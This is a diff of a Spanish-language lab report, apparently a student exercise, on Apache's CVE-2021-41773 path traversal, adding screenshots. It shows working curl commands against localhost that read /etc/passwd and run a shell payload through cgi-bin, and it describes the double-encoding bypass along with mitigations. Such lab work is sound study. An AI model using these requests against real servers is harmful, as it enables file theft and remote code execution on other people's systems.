@@ -1,3 +1,4 @@
+<img width="873" height="383" alt="serverSideSadness" src="https://github.com/user-attachments/assets/862183e3-ec6f-4407-8440-76b0e0a9a021" />
 ## alfa introducción
 ### 1. Selección del CVE
 
@@ -100,14 +101,24 @@ httpd -k restart
 sleep 5
 httpd -k restart
 ```
+<img width="873" height="383" alt="serverSideSadness" src="https://github.com/user-attachments/assets/a3558328-4f1f-43d7-a651-45ef9fb595d1" />
+
 
 ### 4. Explotación controlada
 El ataque es muy sencillo, una vez identificado un servidor mal configurado y vulnerable solo tenemos que mandar una petición GET que utilice el código .%2e en vez de '.' para evitar que la normalización de strings de apache lo detecte como un path en el sistema, permitiendo escribir expresiones como ../../../../etc/passwd en el url sin que el servidor lo maneje adecuadamente.
 
 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`
 
+<img width="458" height="563" alt="traversal" src="https://github.com/user-attachments/assets/74989481-0b46-4853-abd8-aef67575744f" />
+<img width="463" height="92" alt="traversal2" src="https://github.com/user-attachments/assets/572d3d6c-0e44-4ff3-bf57-8d2d21efbf1f" />
+
+
 Si el servidor permite la ejecución de scripts, es posible enviar un payload con código arbitrario al shell del servidor
 `curl -s --data "echo; echo; echo 'buddy u dun fucked up';" "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"`
+
+<img width="454" height="129" alt="clientSideCracked" src="https://github.com/user-attachments/assets/522c2367-ab04-4270-b38d-9e7290efedef" />
+
+<img width="700" height="316" alt="clientSideCracking" src="https://github.com/user-attachments/assets/f0c2ed88-91b6-48c9-a215-8239a80a2e37" />
 
 
 ## close teh attack surface
@@ -118,6 +129,11 @@ Este ataque puede tener éxito porque el saneamiento de entradas de Apache fallo
 Se intento parchar esta vulnerabilidad bloqueando la cadena ".2%e" pero los desarrolladores no previeron que el atacante podía usar doble codificación "%%32%65" para evitar el parche, teniendo como consecuencia el CVE-2021-42013, que finalmente se arregló reescribiendo ap_normalize_path para verificar todo el URL antes de validarlo.
 Otra forma de prevenirlo es tener un control de acceso bien configurado (principio de menor privilegio).
 Un mecanismo que evita que este ataque llegue a la ejecución de código arbitrario es limitar el uso de scripts en un servidor, ya sea por completo o solo permitir la ejecución de scripts firmados.
+
+<img width="881" height="51" alt="serverSideFix1" src="https://github.com/user-attachments/assets/7e15cbb9-9f1b-4c74-b263-b7392fcb9c40" />
+
+<img width="470" height="98" alt="foiled1" src="https://github.com/user-attachments/assets/98c26595-229e-45bf-a3f9-c59f6389c56a" />
+
 
 ### eta. Reflexión personal
 Este ejercicio me dejó mucho mas claro como se desarrolla el Cyber Kill Chain, ya que me toco ejecutar varios de los pasos de la cadena (armificacion, entrega, explotación). Me quedo claro que aun habiendo documentación de una vulnerabilidad, la dificultad de ejecutar un exploit puede variar abismalmente, desde tener que ser preciso a nivel byte, hasta mandar un carácter particular.
